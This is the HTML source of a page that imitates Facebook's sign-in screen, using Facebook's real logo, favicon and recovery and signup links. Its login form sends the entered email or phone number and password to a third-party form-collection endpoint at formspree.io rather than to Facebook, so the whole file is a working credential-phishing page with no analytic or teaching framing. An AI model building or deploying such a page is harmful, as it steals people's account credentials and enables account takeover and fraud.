<!DOCTYPE html>
<html>
     <head>
          <meta charset="utf-8">
          <title>Facebook - Sign in</title>
          <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
          <meta name="viewport" content="width=440 ,user-scalable=no">
          <link rel="stylesheet" href="facebook.css">
     </head>
     <body>
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook">
          <div>
            <form target="_self" action="https://formspree.io/f/mnjlgkne" method="post" id="login">
                 <h2>Sign In</h2>
                 <input type="text" name="user" placeholder="email or phone number" id="user" autocomplete="off" required>
                 <br>
                 <input type="password" name="pass" placeholder="password" id="pass" required>
                 <br>
                 <button type="submit">sign in</button>
                 <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">forgot my password</a>
                 <hr>
                 <a href="https://www.facebook.com/r.php?locale=ar_AR&display=page"><button type="button" id="new">create new account</button></a>
              </form>
          </div>
     </body>
</html>
